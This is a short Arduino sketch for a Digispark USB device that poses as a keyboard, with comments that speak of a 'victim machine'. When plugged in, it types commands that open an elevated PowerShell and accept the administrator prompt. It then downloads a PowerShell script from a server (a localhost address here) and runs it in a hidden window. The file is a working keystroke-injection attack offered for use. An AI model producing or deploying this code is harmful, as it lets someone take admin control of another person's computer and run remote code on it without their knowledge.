// Triggers admin on windows pc and executes following
// Downloads powershell script from server and execute it in hidden mode.
// Set 'Deleys' according to the performance of the victim machine.
// note:- it triggers admin on personal computers only.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';(new-object net.webclient).DownloadFile('http://127.0.0.1/test/files/script.ps1','script.ps1');powershell -windowstyle hidden ./script.ps1;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    
  }
}
